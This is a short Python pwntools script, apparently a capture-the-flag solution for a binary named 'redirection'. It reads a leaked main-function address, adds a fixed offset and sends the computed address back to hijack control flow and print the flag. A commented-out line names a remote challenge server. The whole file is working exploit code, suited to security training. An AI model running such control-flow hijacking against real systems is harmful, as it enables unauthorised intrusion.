from pwn import *


p = process('./redirection')
#p = remote ('34.131.133.224',12346)

output = p.recvline().decode()
print(f"Received: {output}")


main_addr_str = output.split()[-1]
main_addr = int(main_addr_str, 16)  
print(f"Main address: {hex(main_addr)}")


offset = 0xb9
target_addr = main_addr + offset
print(f"Target address: {hex(target_addr)}")

p.sendline(hex(target_addr))

flag_output = p.recvall().decode()
print(f"Output after redirection:\n{flag_output}")


p.close()
